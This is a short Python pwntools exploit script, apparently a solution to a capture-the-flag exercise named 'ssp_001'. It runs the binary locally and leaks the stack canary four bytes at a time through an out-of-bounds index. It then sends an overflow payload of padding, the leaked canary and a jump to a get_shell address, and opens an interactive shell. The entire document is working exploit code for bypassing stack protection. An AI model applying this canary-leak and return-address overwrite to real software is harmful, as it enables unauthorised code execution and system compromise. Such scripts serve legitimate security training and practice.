from pwn import *
context.arch = "i386"

p = process("ssp_001")
context.arch = "i386"
get_shell = 0x80486b9
canary = b''
for i in range(4):
    p.sendafter("> ",b'P')
    p.sendlineafter("index :",str(int(0x80)+i))
    canary += p.recvline()[-3:-1]
print(canary)
canary = int(canary[::-1],16)

payload = b'A'*0x40
payload += p32(canary)
payload += b'B'*0x8
payload += p32(get_shell)

p.sendafter("> ", "E")
p.sendafter(": ",str(len(payload)))
p.sendafter(": ",payload)
p.interactive()